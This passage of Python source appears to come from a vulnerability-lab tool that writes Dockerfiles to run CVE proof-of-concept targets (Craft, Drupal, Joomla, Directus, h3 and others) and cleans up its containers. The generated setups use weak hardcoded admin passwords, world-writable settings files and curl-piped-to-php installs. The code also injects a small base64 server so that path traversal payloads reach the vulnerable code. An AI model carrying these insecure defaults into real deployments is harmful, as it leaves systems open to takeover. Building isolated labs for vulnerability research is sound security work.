                  "ENV MM_EMAILSETTINGS_ENABLESMTPAUTH=false",
                  "ENV MM_LOGSETTINGS_ENABLECONSOLE=true",
                  "ENV MM_LOGSETTINGS_CONSOLELEVEL=INFO",
                  "RUN cp /entrypoint.sh /orig_entrypoint.sh",
                  "RUN printf '#!/bin/sh\\nmysqld_safe --skip-syslog &\\nsleep 8\\nexec /orig_entrypoint.sh \"$@\"' > /start.sh && chmod +x /start.sh",
                  "WORKDIR /mattermost",
                  "EXPOSE 8065",
                  "CMD [\"/start.sh\"]"] + proxy)
        return (_base, 8065, lines)

    if cms == "craft":
        # Craft CMS 4.x — PHP 8.2 + MariaDB in a single fat container.
        # Uses the official php:8.2-apache base and bootstraps MariaDB inside.
        lines = (["WORKDIR /app", "COPY . ."] + proxy +
                 ["RUN apt-get update -qq && apt-get install -y --no-install-recommends "
                  "mariadb-server libpng-dev libjpeg-dev libwebp-dev libzip-dev unzip curl "
                  "libonig-dev && rm -rf /var/lib/apt/lists/*",
                  "RUN docker-php-ext-install pdo pdo_mysql zip gd mbstring bcmath intl",
                  "RUN curl -sS https://getcomposer.org/installer | php -- "
                  "--install-dir=/usr/local/bin --filename=composer",
                  "RUN composer install --no-interaction --prefer-dist 2>/dev/null || true",
                  # Initialise MariaDB and create craft DB
                  "RUN mysqld_safe --skip-networking & sleep 4 && "
                  "mysql -u root -e \"CREATE DATABASE IF NOT EXISTS craft; "
                  "CREATE USER IF NOT EXISTS 'craft'@'localhost' IDENTIFIED BY 'craft'; "
                  "GRANT ALL ON craft.* TO 'craft'@'localhost';\"",
                  "ENV CRAFT_ENVIRONMENT=dev",
                  "ENV DB_DRIVER=mysql",
                  "ENV DB_SERVER=127.0.0.1",
                  "ENV DB_PORT=3306",
                  "ENV DB_DATABASE=craft",
                  "ENV DB_USER=craft",
                  "ENV DB_PASSWORD=craft",
                  "ENV SECURITY_KEY=binoracle_dev_security_key_32chXX",
                  "ENV CRAFT_ALLOW_ADMIN_CHANGES=true",
                  "ENV ALLOW_IFRAMES=true",
                  'CMD ["sh", "-c", "mysqld_safe --skip-networking & sleep 3 '
                  '&& php craft install/check 2>/dev/null; apache2-foreground"]'])
        return ("php:8.2-apache", 80, lines)

    if cms == "directus":
        lines = (["WORKDIR /directus", "COPY . ."] + proxy +
                 ["ENV NODE_ENV=production",
                  "ENV DB_CLIENT=sqlite3",
                  "ENV DB_FILENAME=/directus/database/database.db",
                  "ENV SECRET=binoracle_directus_secret_32ch",
                  "ENV ADMIN_EMAIL=admin@binoracle.local",
                  "ENV ADMIN_PASSWORD=binoracle_admin",
                  "ENV PUBLIC_URL=http://localhost:8055",
                  "RUN npm install || npm install --legacy-peer-deps || true",
                  'CMD ["npx", "directus", "start"]'])
        return ("node:18-alpine", 8055, lines)

    if cms == "keystone":
        lines = (["WORKDIR /app", "COPY . ."] + proxy +
                 ["ENV NODE_ENV=development",
                  "ENV SESSION_SECRET=binoracle_keystone_session_32ch",
                  "ENV DATABASE_URL=file:./keystone.db",
                  "RUN npm install || npm install --legacy-peer-deps || true",
                  'CMD ["sh", "-c", "npm run dev || npm start || npx keystone dev"]'])
        return ("node:18-alpine", 3000, lines)

    if cms == "drupal":
        # Drupal 10/11 — official image (PHP 8.2 + Apache + all extensions)
        # MariaDB bootstrapped inside a single container for lab isolation.
        _base = _pin_cms_image("drupal:10-apache", pkg_version)
        lines = (["WORKDIR /var/www/html", "COPY . ."] + proxy +
                 ["RUN apt-get update -qq && apt-get install -y --no-install-recommends "
                  "mariadb-server unzip curl && rm -rf /var/lib/apt/lists/*",
                  # Ensure composer/drush
                  "RUN which composer || (curl -sS https://getcomposer.org/installer | "
                  "php -- --install-dir=/usr/local/bin --filename=composer)",
                  "RUN composer require drush/drush --no-interaction 2>/dev/null || true",
                  # Bootstrap MariaDB
                  "RUN mysqld_safe --skip-networking & sleep 4 && "
                  "mysql -u root -e \"CREATE DATABASE IF NOT EXISTS drupal; "
                  "GRANT ALL ON drupal.* TO 'drupal'@'localhost' IDENTIFIED BY 'drupalpass';\" && "
                  "mysqladmin -u root shutdown",
                  # Minimal settings
                  "RUN cp sites/default/default.settings.php sites/default/settings.php 2>/dev/null || true",
                  "RUN chmod 777 sites/default sites/default/settings.php 2>/dev/null || true",
                  "ENV DRUPAL_DB_URL=mysql://drupal:drupalpass@127.0.0.1/drupal",
                  'CMD ["sh", "-c", "mysqld_safe --skip-networking=false & sleep 5 && '
                  'vendor/bin/drush si standard --yes '
                  '--db-url=$DRUPAL_DB_URL --account-pass=admin 2>/dev/null | tail -3; '
                  'apache2-foreground"]'])
        return (_base, 80, lines)

    if cms == "joomla":
        # Joomla 4/5 — single-container with MariaDB inside
        _base = _pin_cms_image("php:8.2-apache", pkg_version)
        lines = (["WORKDIR /var/www/html", "COPY . ."] + proxy +
                 ["RUN apt-get update -qq && apt-get install -y --no-install-recommends "
                  "mariadb-server libpng-dev libzip-dev unzip curl libonig-dev "
                  "libxml2-dev && rm -rf /var/lib/apt/lists/*",
                  "RUN docker-php-ext-install pdo pdo_mysql zip mbstring xml bcmath",
                  "RUN curl -sS https://getcomposer.org/installer | php -- "
                  "--install-dir=/usr/local/bin --filename=composer",
                  "RUN composer install --no-interaction --prefer-dist 2>/dev/null || true",
                  "RUN mysqld_safe --skip-networking & sleep 4 && "
                  "mysql -u root -e \"CREATE DATABASE IF NOT EXISTS joomla; "
                  "GRANT ALL ON joomla.* TO 'joomla'@'localhost' IDENTIFIED BY 'joomlapass';\" && "
                  "mysqladmin -u root shutdown",
                  # Joomla CLI install
                  "RUN chmod -R 755 /var/www/html && chown -R www-data:www-data /var/www/html",
                  "ENV JOOMLA_DB_HOST=127.0.0.1 JOOMLA_DB_NAME=joomla "
                  "JOOMLA_DB_USER=joomla JOOMLA_DB_PASS=joomlapass",
                  'CMD ["sh", "-c", "mysqld_safe --skip-networking=false & sleep 5 && '
                  'php installation/joomla.php install --no-interaction '
                  '--db-type=mysql --db-host=127.0.0.1 --db-name=joomla '
                  '--db-user=joomla --db-pass=joomlapass --admin-user=admin '
                  '--admin-pass=admin --admin-email=admin@localhost 2>/dev/null; '
                  'apache2-foreground"]'])
        return (_base, 80, lines)

    if cms in ("typo3", "contao", "prestashop"):
        # Generic PHP CMS fallback with MariaDB
        _base = "php:8.2-apache"
        lines = (["WORKDIR /var/www/html", "COPY . ."] + proxy +
                 ["RUN apt-get update -qq && apt-get install -y --no-install-recommends "
                  "mariadb-server libpng-dev libzip-dev unzip curl libonig-dev "
                  "libxml2-dev libgd-dev && rm -rf /var/lib/apt/lists/*",
                  "RUN docker-php-ext-install pdo pdo_mysql zip gd mbstring xml bcmath",
                  "RUN curl -sS https://getcomposer.org/installer | php -- "
                  "--install-dir=/usr/local/bin --filename=composer",
                  "RUN composer install --no-interaction --prefer-dist 2>/dev/null || true",
                  "RUN mysqld_safe --skip-networking & sleep 4 && "
                  "mysql -u root -e \"CREATE DATABASE IF NOT EXISTS app; "
                  "GRANT ALL ON app.* TO 'app'@'localhost' IDENTIFIED BY 'apppass';\" && "
                  "mysqladmin -u root shutdown",
                  'CMD ["sh", "-c", "mysqld_safe --skip-networking=false & sleep 5 && '
                  'apache2-foreground"]'])
        return (_base, 80, lines)

    # Node.js meta-frameworks and modern web frameworks
    if cms in ("vite", "h3", "nitro", "hono", "elysia", "remix", "sveltekit", "astro"):
        _port_map = {"vite": 5173, "h3": 3000, "nitro": 3000, "hono": 3000,
                     "elysia": 3000, "remix": 3000, "sveltekit": 5173, "astro": 4321}
        _port = _port_map.get(cms, 3000)
        _start_cmd = {
            "vite": "npm run dev -- --host 0.0.0.0",
            "h3": "node server.js || node index.js || npx tsx server.ts || npx tsx index.ts",
            "nitro": "node .output/server/index.mjs || npm run build && node .output/server/index.mjs",
            "hono": "node dist/index.js || npx tsx src/index.ts || node src/index.js",
            "elysia": "bun run src/index.ts || node dist/index.js",
            "remix": "npm run build && npm start",
            "sveltekit": "npm run build && node build",
            "astro": "npm run build && node dist/server/entry.mjs",
        }.get(cms, "npm start")
        # h3 v1.x uses toNodeListener() — inject a base64-encoded fallback server.js when
        # the CVE repo has no entry point (CVE-2026-86253 lab had no server.js/index.js).
        # The fallback wires h3.createApp() → h3.serveStatic() → h3.toNodeListener() so
        # static-file path traversal payloads reach the vulnerable code path.
        _H3_FALLBACK_B64 = (
            "Y29uc3QgaHR0cD1yZXF1aXJlKCJodHRwIik7Y29uc3QgaDM9cmVxdWlyZSgiaDMiKTtjb25zdCBhcHA"
            "9aDMuY3JlYXRlQXBwKCk7aWYoaDMuc2VydmVTdGF0aWMpe2FwcC51c2UoaDMuZXZlbnRIYW5kbGVyKG"
            "FzeW5jKGUpPT5oMy5zZXJ2ZVN0YXRpYyhlLHtyb290OnByb2Nlc3MuZW52LlNUQVRJQ19ST09UfHwiLi"
            "J9KSkpO31jb25zdCBMPWgzLnRvTm9kZUxpc3RlbmVyP2gzLnRvTm9kZUxpc3RlbmVyKGFwcCk6bnVs"
            "bDtpZighTCl7cHJvY2Vzcy5leGl0KDEpO31odHRwLmNyZWF0ZVNlcnZlcihMKS5saXN0ZW4oMzAwMCwi"
            "MC4wLjAuMCIsKCk9PmNvbnNvbGUubG9nKCJoMzozMDAwIikpOw=="
        )
        _h3_inject = (
            f"printf '%s' '{_H3_FALLBACK_B64}' | base64 -d > /app/_h3fb.js && "
            f"([ -f server.js ] || [ -f index.js ] || "
            f"[ -f server.ts ] || [ -f index.ts ] || cp /app/_h3fb.js server.js)"
        )
        lines = (["WORKDIR /app", "COPY . ."] + proxy +
                 ["RUN npm install || npm install --legacy-peer-deps || true"] +
                 ([f"RUN {_h3_inject}"] if cms == "h3" else []) +
                 [f'CMD ["sh", "-c", "{_start_cmd}"]'])
        return ("node:20-alpine", _port, lines)

    # Ruby frameworks
    if cms in ("sinatra", "rack", "rails"):
        _port = 9292 if cms in ("sinatra", "rack") else 3000
        _start_cmd = {
            "sinatra": "ruby app.rb -o 0.0.0.0 -p 9292 || rackup --host 0.0.0.0 -p 9292",
            "rack": "rackup --host 0.0.0.0 -p 9292",
            "rails": "RAILS_ENV=development rails server -b 0.0.0.0 -p 3000",
        }.get(cms, "rackup --host 0.0.0.0 -p 9292")
        # Rails: also install libvips + libmagickwand for Active Storage image processing
        _extra_pkgs = ""
        if cms == "rails":
            _extra_pkgs = ("RUN apt-get update -qq && apt-get install -y --no-install-recommends "
                           "libvips-dev libmagickwand-dev curl nodejs yarn postgresql-client "
                           "sqlite3 libsqlite3-dev && rm -rf /var/lib/apt/lists/*\n")
        lines = (["WORKDIR /app", "COPY . ."] + proxy +
                 ([_extra_pkgs] if _extra_pkgs else []) +
                 ["RUN gem install bundler && bundle install || true",
                  "RUN rails db:create db:migrate 2>/dev/null || true",
                  f'CMD ["sh", "-c", "{_start_cmd}"]'])
        return ("ruby:3.2-slim", _port, lines)

    # Python web frameworks
    if cms in ("django", "flask", "fastapi", "gradio"):
        _port = 8000
        _start_cmd = {
            "django": "python manage.py migrate --run-syncdb 2>/dev/null || true && python manage.py runserver 0.0.0.0:8000",
            "flask": "FLASK_ENV=development python app.py || FLASK_ENV=development flask run --host 0.0.0.0 --port 8000",
            "fastapi": "uvicorn main:app --host 0.0.0.0 --port 8000 || uvicorn app.main:app --host 0.0.0.0 --port 8000",
            "gradio": "python app.py || python main.py",
        }.get(cms, "python app.py")
        lines = (["WORKDIR /app", "COPY . ."] + proxy +
                 ["RUN pip install -r requirements.txt 2>/dev/null || "
                  "pip install -r requirements.txt --no-cache-dir || true",
                  f'CMD ["sh", "-c", "{_start_cmd}"]'])
        return ("python:3.11-slim", _port, lines)

    return None


def _detect_and_write_auto_dockerfile(source_dir: str,
                                       pkg_version: str = "") -> Optional[dict]:
    """Cuando el repo NO trae su propio Dockerfile/docker-compose.yml, detecta el stack por sus
    ficheros delatores (package.json/requirements.txt/composer.json, o sueltos .php) y ESCRIBE
    un Dockerfile minimo propio para arrancarlo -- deliberadamente acotado a Node/Ruby/Python/PHP sin
    framework (los casos mas comunes en PoCs publicos), no un intento de adivinar cualquier
    stack posible. El Dockerfile generado queda guardado en el propio directorio del codigo
    (_AUTO_DOCKERFILE_NAME) para que quede constancia de que NO es el del autor del PoC -- el
    `step()` del caller debe dejarlo igual de explicito en el informe.

    `pkg_version`: when set, pins the CMS/stack image to this exact version.
    """
    # Deteccion de CMS conocido primero (Ghost, Strapi, Payload, Wagtail...)
    cms = _detect_cms_fingerprint(source_dir)
    if cms:
        cms_tup = _cms_dockerfile_lines(cms, source_dir, pkg_version=pkg_version)
        if cms_tup:
            base_image, port, cms_lines = cms_tup
            lines = [f"FROM {base_image}"] + cms_lines + [f"EXPOSE {port}"]
            path = os.path.join(source_dir, _AUTO_DOCKERFILE_NAME)
            with open(path, "w") as f:
                f.write("\n".join(lines) + "\n")
            return {"kind": "dockerfile", "path": path, "context": source_dir,
                    "auto_generado": True, "stack_detectado": f"CMS:{cms}",
                    "cms": cms}

    import glob as _sgl
    for signal_file, base_image, port, run_lines in _STACK_SIGNALS:
        if "*" in signal_file:
            # Glob pattern (e.g. *.csproj) — find any match in source_dir root
            _matches = _sgl.glob(os.path.join(source_dir, signal_file))
            if not _matches:
                continue
            signal_path = _matches[0]
        else:
            signal_path = os.path.join(source_dir, signal_file)
            if not os.path.isfile(signal_path):
                continue
        if signal_file == "package.json" and not _package_json_has_runnable_entry(signal_path):
            continue
        lines = [f"FROM {base_image}"] + _proxy_dockerfile_lines(source_dir) + run_lines + [f"EXPOSE {port}"]
        path = os.path.join(source_dir, _AUTO_DOCKERFILE_NAME)
        with open(path, "w") as f:
            f.write("\n".join(lines) + "\n")
        return {"kind": "dockerfile", "path": path, "context": source_dir,
               "auto_generado": True, "stack_detectado": signal_file}
    flask_module = _detect_bare_flask_entry(source_dir)
    if flask_module:
        _py_img = _best_python_image()
        _flask_pip = (["RUN " + _alpine_python_build_deps().split("RUN ", 1)[1]]
                      if "alpine" in _py_img else [])
        lines = ([f"FROM {_py_img}"] + _proxy_dockerfile_lines(source_dir) +
                ["WORKDIR /app", "COPY . ."] + _flask_pip +
                ["RUN pip install --no-cache-dir flask",
                 f"ENV FLASK_APP={flask_module}",
                 'CMD ["python", "-m", "flask", "run", "--host=0.0.0.0", "--port=5000"]',
                 "EXPOSE 5000"])
        path = os.path.join(source_dir, _AUTO_DOCKERFILE_NAME)
        with open(path, "w") as f:
            f.write("\n".join(lines) + "\n")
        return {"kind": "dockerfile", "path": path, "context": source_dir,
               "auto_generado": True, "stack_detectado": f"*.py (Flask suelto: {flask_module})"}
    has_bare_php = any(fn.lower().endswith(".php")
                      for fn in os.listdir(source_dir) if os.path.isfile(os.path.join(source_dir, fn)))
    if not has_bare_php:
        for root, dirs, files in os.walk(source_dir):
            depth = root[len(source_dir):].count(os.sep)
            if depth > 2:
                dirs[:] = []
                continue
            if any(fn.lower().endswith(".php") for fn in files):
                has_bare_php = True
                break
    if has_bare_php:
        lines = (["FROM php:8.2-cli"] + _proxy_dockerfile_lines(source_dir) +
                _PHP_BARE_DOCKERFILE + ["EXPOSE 8000"])
        path = os.path.join(source_dir, _AUTO_DOCKERFILE_NAME)
        with open(path, "w") as f:
            f.write("\n".join(lines) + "\n")
        return {"kind": "dockerfile", "path": path, "context": source_dir,
               "auto_generado": True, "stack_detectado": "*.php (sin composer.json)"}
    return None


def cleanup_stale_lab_containers(prefix: str = "bo_lab_", max_age_minutes: int = 60,
                                  dry_run: bool = False) -> List[str]:
    """Stop and remove binoracle lab containers older than max_age_minutes.

    Called automatically at the start of each lab spin-up to avoid port
    collisions from interrupted previous runs. Non-fatal: any error is ignored.

    Returns list of container names that were cleaned up.
    """
    import json as _json
    killed: List[str] = []
    try:
        out = subprocess.run(
            ["docker", "ps", "-a", "--format", "{{json .}}"],
            capture_output=True, text=True, timeout=10)
        if out.returncode != 0:
            return []
        for line in (out.stdout or "").splitlines():
            line = line.strip()
            if not line:
                continue
            try:
                info = _json.loads(line)
            except Exception:
                continue
            name = info.get("Names", "")
            status = (info.get("Status") or "").lower()
            if not name.startswith(prefix):
                continue
            # Parse container age from Status string (e.g. "Up 2 hours", "Exited (0) 3 hours ago")
            age_minutes = 0
            import re as _re_age
            _m = _re_age.search(r'(\d+)\s+(second|minute|hour|day)', status)
            if _m:
                n, unit = int(_m.group(1)), _m.group(2)
                if unit.startswith("second"):
                    age_minutes = n / 60
                elif unit.startswith("minute"):
                    age_minutes = n
                elif unit.startswith("hour"):
                    age_minutes = n * 60
                elif unit.startswith("day"):
                    age_minutes = n * 1440
            else:
                # Unknown age → treat as old
                age_minutes = max_age_minutes + 1
            if age_minutes >= max_age_minutes:
                if not dry_run:
                    subprocess.run(["docker", "stop", name],
                                   capture_output=True, timeout=15)
                    subprocess.run(["docker", "rm", "-f", name],
                                   capture_output=True, timeout=10)
                killed.append(name)
    except Exception:
        pass
    return killed


def cleanup_docker_disk_pressure(
        min_free_gb: float = 2.0,
        image_max_age_hours: int = 24,
        on_step=None) -> dict:
    """Free Docker disk space when available disk drops below min_free_gb.

    Steps taken (in order, stopping when free space is restored):
      1. Remove exited bo_lab_* containers.
      2. Remove Docker images whose RepoTag starts with 'bo_' and are
         older than image_max_age_hours.
      3. If still tight: docker image prune -f (dangling images only).
      4. If still tight: docker system prune -f (containers + networks +
         dangling images — does NOT touch named volumes).

    Returns a dict with keys: free_gb_before, free_gb_after, actions.
    Non-fatal: any subprocess error is caught and logged in actions.
    """
    import shutil as _shutil
    import json as _json
    import time as _time

    def _step(msg: str) -> None:
        if on_step:
            on_step(msg)

    def _free_gb() -> float:
        try:
            return _shutil.disk_usage("/").free / (1024 ** 3)
        except Exception:
            return 999.0

    actions: list[str] = []
    free_before = _free_gb()

    if free_before >= min_free_gb:
        return {"free_gb_before": free_before, "free_gb_after": free_before, "actions": []}

    _step(f"[disk] espacio libre: {free_before:.1f} GB < {min_free_gb} GB — iniciando limpieza")

    # Step 1: stale containers
    try:
        out = subprocess.run(
            ["docker", "ps", "-a", "-q", "--filter", "status=exited",
             "--filter", "name=bo_lab_"],
            capture_output=True, text=True, timeout=10)
        ids = [i.strip() for i in (out.stdout or "").splitlines() if i.strip()]
        if ids:
            subprocess.run(["docker", "rm", "-f"] + ids,
                           capture_output=True, timeout=20)
            actions.append(f"removed {len(ids)} exited bo_lab_* containers")
            _step(f"[disk] eliminados {len(ids)} contenedores bo_lab_* salidos")
    except Exception as _e:
        actions.append(f"container-rm error: {_e}")

    if _free_gb() >= min_free_gb:
        return {"free_gb_before": free_before, "free_gb_after": _free_gb(), "actions": actions}

    # Step 2: old bo_ images
    try:
        out = subprocess.run(
            ["docker", "images", "--format", "{{json .}}"],
            capture_output=True, text=True, timeout=15)
        now_ts = _time.time()
        removed_images = 0
        for line in (out.stdout or "").splitlines():
            line = line.strip()
            if not line:
                continue
            try:
                info = _json.loads(line)
            except Exception:
                continue
            tag = info.get("Repository", "") + ":" + info.get("Tag", "")
            created = info.get("CreatedAt", "")
            img_id = info.get("ID", "")
            if not (tag.startswith("bo_") or tag.startswith("bo:")):
                continue
            # Parse age from CreatedAt ("2024-01-15 12:34:56 +0000 UTC")
            try:
                from datetime import datetime as _dt
                _ts = _dt.strptime(created[:19], "%Y-%m-%d %H:%M:%S").timestamp()
                age_hours = (now_ts - _ts) / 3600
            except Exception:
                age_hours = image_max_age_hours + 1
            if age_hours >= image_max_age_hours and img_id:
                subprocess.run(["docker", "rmi", "-f", img_id],
                               capture_output=True, timeout=30)
                removed_images += 1
        if removed_images:
            actions.append(f"removed {removed_images} bo_* images older than {image_max_age_hours}h")
            _step(f"[disk] eliminadas {removed_images} imágenes bo_* antiguas")
    except Exception as _e:
        actions.append(f"image-rm error: {_e}")

    if _free_gb() >= min_free_gb:
        return {"free_gb_before": free_before, "free_gb_after": _free_gb(), "actions": actions}

    # Step 3: dangling images prune
    try:
        subprocess.run(["docker", "image", "prune", "-f"],
                       capture_output=True, timeout=60)
        actions.append("docker image prune -f (dangling)")
        _step("[disk] docker image prune -f ejecutado")
    except Exception as _e:
        actions.append(f"image-prune error: {_e}")

    if _free_gb() >= min_free_gb:
        return {"free_gb_before": free_before, "free_gb_after": _free_gb(), "actions": actions}

    # Step 4: full system prune (last resort — no volumes)
    try:
        subprocess.run(["docker", "system", "prune", "-f"],
                       capture_output=True, timeout=120)
        actions.append("docker system prune -f (containers+networks+dangling)")
        _step("[disk] docker system prune -f ejecutado")
    except Exception as _e:
        actions.append(f"system-prune error: {_e}")

    free_after = _free_gb()
    _step(f"[disk] limpieza completada: {free_before:.1f} → {free_after:.1f} GB libres")
    return {"free_gb_before": free_before, "free_gb_after": free_after, "actions": actions}


def _dockerfile_is_buildable(df_path: str, context_dir: str) -> bool:
    """Return False for 'deployment Dockerfiles' that COPY pre-built binaries not present
    in the source tree (e.g. COPY app-linux-amd64 /bin/app). These are release packaging
    Dockerfiles — trying to build them always fails with 'file not found in build context'.

    Heuristic: if any non-stage COPY references a file that (a) has a binary-platform
    suffix (-linux-amd64, -darwin-, -arm64, .exe, etc.) AND (b) does not exist in the
    context dir, it is a deployment-only Dockerfile.
    """
    import re as _re
    # Patterns that indicate a pre-compiled binary name
    _BINARY_PLATFORM_RE = _re.compile(
        r'(?i)(-linux-|-darwin-|-windows-|-amd64|-arm64|-386|-musl|\.exe$|'
        r'-linux$|-darwin$|-windows$)')
    # COPY directives that reference local files (not --from=<stage> multistage)
    _copy_re = _re.compile(r'^\s*COPY\s+(?!--from=\S)(\S+)', re.M)
    try:
        content = open(df_path, encoding="utf-8", errors="replace").read()
    except OSError:
        return True  # assume buildable if unreadable
    local_copies = _copy_re.findall(content)
    if not local_copies:
        return True  # no local COPY → safe to try
    for src in local_copies:
        if src in (".", "./", ".."):
            return True  # COPY . . → source copy → buildable
        # Binary platform suffix AND file missing → deployment Dockerfile
        if _BINARY_PLATFORM_RE.search(src):
            candidate = os.path.join(context_dir, src)
            if not os.path.exists(candidate):
                return False  # pre-built binary missing → skip this Dockerfile
    return True


def _find_free_port(preferred: int = 0, start: int = 10000, end: int = 60000) -> int:
    """Return a free TCP port on 127.0.0.1.

    If preferred > 0 and it is free, return it.  Otherwise scan randomly in
    [start, end] until a free port is found, with a fallback to OS-assigned.
    """
    import socket as _socket
    import random as _random

    def _is_free(p: int) -> bool:
        try:
            with _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM) as s:
                s.setsockopt(_socket.SOL_SOCKET, _socket.SO_REUSEADDR, 1)
                s.bind(("127.0.0.1", p))
                return True
        except OSError:
            return False

    if preferred and _is_free(preferred):
        return preferred
    # Try random ports first (avoids hot range collisions)
    for _ in range(40):
        p = _random.randint(start, end)
        if _is_free(p):
            return p
    # OS-assigned fallback
    with _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM) as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def _patch_compose_platform(compose_path: str) -> bool:
    """Inject `platform: linux/amd64` into every service that lacks it.

    C11: needed on Mac ARM (Apple Silicon) when an image is amd64-only.
    Returns True if any service was patched, False otherwise.  Non-fatal.
    """
    try:
        raw = open(compose_path, encoding="utf-8").read()
        lines = raw.splitlines(keepends=True)
        new_lines: list[str] = []
        in_services = False
        service_has_platform: dict[str, bool] = {}
        current_svc: Optional[str] = None
        _svc_re = re.compile(r'^( {2}|\t)(\w[\w._-]*):\s*$')
        _plat_re = re.compile(r'^\s*platform\s*:')
        for line in lines:
            stripped = line.rstrip('\n')
            if stripped.strip() == "services:":
                in_services = True
            elif in_services:
                m = _svc_re.match(stripped)
                if m:
                    current_svc = m.group(2)
                    service_has_platform[current_svc] = False
                elif current_svc and _plat_re.match(stripped):
                    service_has_platform[current_svc] = True
            new_lines.append(line)
        if not service_has_platform:
            return False
        # Second pass: inject platform after each service definition line
        result_lines: list[str] = []
        in_services = False
        current_svc = None
        injected = set()
        for line in new_lines:
            stripped = line.rstrip('\n')
            if stripped.strip() == "services:":
                in_services = True
                result_lines.append(line)
                continue
            if in_services:
                m = _svc_re.match(stripped)
                if m:
                    svc = m.group(2)
                    if svc not in injected and not service_has_platform.get(svc, True):
                        result_lines.append(line)
                        indent = m.group(1)
                        result_lines.append(f"{indent}  platform: linux/amd64\n")
                        injected.add(svc)
                        continue
            result_lines.append(line)
        if injected:
            with open(compose_path, "w", encoding="utf-8") as f:
                f.writelines(result_lines)
            return True
    except Exception:
        pass
    return False


def _resolve_docker_tag(image: str, wanted_version: str,
                        timeout: float = 10.0) -> str:
    """C12: Resolve the closest available Docker Hub tag for a versioned image.

    Queries the Docker Hub v2 API.  Returns the best matching tag, or the
    original ``image`` string unchanged on any error.  Results cached in
    ~/.cache/binoracle/docker_tags.json (non-fatal if cache write fails).
    """
    if ":" not in image or not wanted_version:
        return image
    repo_part = image.split(":")[0]  # e.g. "ghost" or "library/ghost"
    if "/" not in repo_part:
        repo_part = f"library/{repo_part}"

    cache_key = f"{repo_part}:{wanted_version}"
    _cache_path = os.path.join(
        os.environ.get("BINORACLE_CACHE_DIR") or os.path.join(
            os.path.expanduser("~"), ".cache", "binoracle"),
        "docker_tags.json")
    try:
        import json as _j
        if os.path.exists(_cache_path):
            _cached = _j.load(open(_cache_path))
            if cache_key in _cached:
                return _cached[cache_key]
    except Exception:
        _cached = {}

    try:
        import urllib.request as _ur
        url = (f"https://hub.docker.com/v2/repositories/{repo_part}/tags"
               f"?name={wanted_version}&page_size=25&ordering=last_updated")
        req = _ur.Request(url, headers={"User-Agent": "binoracle/cvefeed"})
        with _ur.urlopen(req, timeout=timeout) as resp:
            import json as _j2
            data = _j2.loads(resp.read())
        results = data.get("results") or []
        # Prefer exact match, then closest prefix match
        exact = next((t["name"] for t in results if t["name"] == wanted_version), None)
        if exact:
            best = f"{image.split(':')[0]}:{exact}"
        elif results:
            best = f"{image.split(':')[0]}:{results[0]['name']}"
        else:
            best = image
        try:
            import json as _j3
            _cached[cache_key] = best
            os.makedirs(os.path.dirname(_cache_path), exist_ok=True)
            _j3.dump(_cached, open(_cache_path, "w"))
        except Exception:
            pass
        return best
    except Exception:
        return image


def _patch_compose_ports(compose_path: str) -> dict:
    """Rewrite fixed host-port bindings in a docker-compose file to free ports.

    For every service that has  ports: ["HPORT:CPORT"]  or  ports: [HPORT:CPORT],
    replace HPORT with a free host port if HPORT is already bound on the host.

    Returns {original_port: new_port} for all ports that were remapped,
    or empty dict when no remapping was needed.
    Non-fatal: if parsing or writing fails the original file is left untouched.
    """
    import socket as _socket

    def _port_in_use(p: int) -> bool:
        try:
            with _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM) as s:
                s.settimeout(0.3)
                return s.connect_ex(("127.0.0.1", p)) == 0
        except Exception:
            return False

    remapped: dict[int, int] = {}
    try:
        raw = open(compose_path, encoding="utf-8").read()
        lines = raw.splitlines(keepends=True)
        new_lines: list[str] = []
        _port_re = re.compile(
            r'^(\s*-\s*["\']?)(\d{2,5}):(\d{2,5})(["\']?\s*)$')
        for line in lines:
            m = _port_re.match(line)
            if m:
                prefix, hport_s, cport_s, suffix = m.groups()
                hport = int(hport_s)
                if _port_in_use(hport):
                    new_hport = _find_free_port(start=hport + 1, end=60000)
                    remapped[hport] = new_hport
                    line = f"{prefix}{new_hport}:{cport_s}{suffix}\n"
            new_lines.append(line)
        if remapped:
            with open(compose_path, "w", encoding="utf-8") as f:
                f.writelines(new_lines)
    except Exception:
        pass
    return remapped


def _find_build_target(source_dir: str, pkg_version: str = "") -> Optional[dict]:
    """Busca, en el codigo YA descargado, como arrancar el objetivo -- un docker-compose.yml/
    compose.yml (en la raiz o un nivel por debajo, el sitio donde casi todo el mundo lo pone), o
    si no hay, un Dockerfile suelto. Si NINGUNO de los dos existe, intenta detectar el stack por
    sus propios ficheros (package.json/requirements.txt/composer.json/*.php) y generar un
    Dockerfile minimo propio (ver _detect_and_write_auto_dockerfile) -- deliberadamente acotado a
    un numero pequeno de stacks comunes, nunca una garantia de arrancar CUALQUIER repo. Devuelve
    None solo si nada de esto aplica."""
    for root, dirs, files in os.walk(source_dir):
        depth = root[len(source_dir):].count(os.sep)
        if depth > 2:
            dirs[:] = []
            continue
        for name in _COMPOSE_NAMES:
            if name in files:
                _cpath = os.path.join(root, name)
                # Skip empty or near-empty compose files (< 20 bytes / no service key)
                try:
                    _ctxt = open(_cpath, encoding="utf-8", errors="replace").read(512).strip()
                    if len(_ctxt) < 20 or "service" not in _ctxt.lower():
                        continue
                except OSError:
                    continue
                return {"kind": "compose", "path": _cpath, "context": root}
    for root, dirs, files in os.walk(source_dir):
        depth = root[len(source_dir):].count(os.sep)
        if depth > 2:
            dirs[:] = []
            continue
        if "Dockerfile" in files:
            df_path = os.path.join(root, "Dockerfile")
            # Skip "deployment Dockerfiles" that COPY pre-built binaries not present in
            # the source tree (e.g. daptin's Dockerfile: COPY daptin-linux-amd64 /opt/...).
            # These are release packaging Dockerfiles, not build-from-source ones.
            if not _dockerfile_is_buildable(df_path, root):
                continue
            return {"kind": "dockerfile", "path": df_path, "context": root}
    return _detect_and_write_auto_dockerfile(source_dir, pkg_version=pkg_version)


def _exposed_ports_from_dockerfile(path: str) -> List[int]:
    ports: List[int] = []
    try:
        with open(path, "r", errors="ignore") as f:
            for line in f:
                m = re.match(r"\s*EXPOSE\s+([0-9 ]+)", line, re.IGNORECASE)
                if m:
                    ports.extend(int(p) for p in m.group(1).split() if p.isdigit())
    except OSError:
        pass
    return ports


# puertos comunes para cuando el Dockerfile no declara EXPOSE (pasa mas de lo que parece) -- los
# que de verdad usan por defecto Flask/Django/Express/Rails/Spring/ASP.NET/PHP-FPM+nginx/etc.
_COMMON_PORTS = [80, 8080, 3000, 5000, 8000, 4000, 8888, 9000, 4200, 1337]


class _GenericLab:
